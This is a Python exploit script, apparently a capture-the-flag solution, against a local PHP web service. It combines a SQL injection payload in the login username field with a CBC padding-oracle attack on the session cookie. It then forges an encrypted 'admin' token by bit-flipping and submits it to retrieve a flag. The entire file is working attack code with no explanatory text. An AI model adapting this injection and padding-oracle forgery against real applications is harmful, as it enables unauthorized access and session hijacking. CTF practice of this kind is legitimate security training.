import requests
import base64

url = 'http://localhost:8085'
N = 16
phpsession = ""
ID = ""

def inject1(password):
    param = {
        'username': "' union select 'bendawangbendawangbendawang','{password}".format(password=password),
        'password': ''
    }
    result = requests.post(url, data=param)
    return result

def inject_token(token):

    ID2 = base64.b64decode(ID).decode('utf-8', errors='ignore')

    header = {
        "Cookie": "PHPSESSID=" + phpsession + ";token=" + token + ";ID=" + ID2
    }
    result = requests.post(url, headers=header)
    return result

def xor(a, b):
    return bytes(a[i] ^ b[i % len(b)] for i in range(len(a))).decode('latin1')

def pad(string, N):
    l = len(string)
    if l != N:
        return string + chr(N - l)

def pad2(data, block_size):
    # Calcule o número de bytes a adicionar
    padding_length = block_size - (len(data) % block_size)
    # Crie o padding (bytes do valor de padding_length)
    padding = chr(padding_length) * padding_length
    # Retorne os dados originais com o padding adicionado
    return data + padding      

def padding_oracle(N, cipher):
    get = ""
    for i in range(1, N + 1):
        for j in range(256):
            padding = xor(get.encode('utf-8'), chr(i).encode('utf-8') * (i - 1))
            c = chr(0) * (16 - i) + chr(j) + padding + cipher
            print(c.encode('utf-8').hex())
            result = inject1(base64.b64encode(chr(0).encode('utf-8') * 16 + c.encode('utf-8')).decode('utf-8'))
            if "ctfer" not in result.content.decode('utf-8'):
                get = chr(j ^ i) + get
                break
    return get

session = inject1("bendawang").headers['set-cookie'].split(',')
phpsession = session[0].split(";")[0][10:]
print(phpsession)
ID = base64.b64decode(session[1][4:].replace("%3D", '=').replace("%2F", '/').replace("%2B", '+')).decode('utf-8', errors='ignore')
token = base64.b64decode(session[2][6:].replace("%3D", '=').replace("%2F", '/').replace("%2B", '+')).decode('utf-8', errors='ignore')

middle = padding_oracle(N, ID)
print("ID:" + base64.b64encode(ID.encode('utf-8')).decode('utf-8'))
print("token:" + base64.b64encode(token.encode('utf-8')).decode('utf-8'))
print("middle:" + base64.b64encode(middle.encode('utf-8')).decode('utf-8'))
print("\n")

if len(middle) == 16:
    plaintext = xor(middle.encode('utf-8'), token.encode('utf-8'))
    print(plaintext)
    print(base64.b64encode(plaintext.encode('utf-8')).decode('utf-8'))
    des = pad2('admin', N)
    token = pad2(token, N)
    tmp = ""
    print(base64.b64encode(des.encode('utf-8')).decode('utf-8'))
    for i in range(16):
        tmp += chr(ord(token[i]) ^ ord(plaintext[i]) ^ ord(des[i]))

    print(base64.b64encode(tmp.encode('utf-8')).decode('utf-8'))

    result = inject_token(base64.b64encode(tmp.encode('utf-8')).decode('utf-8'))
    print(result.content.decode('utf-8'))
    if "flag" in result.content.decode('utf-8'):
        input("success")
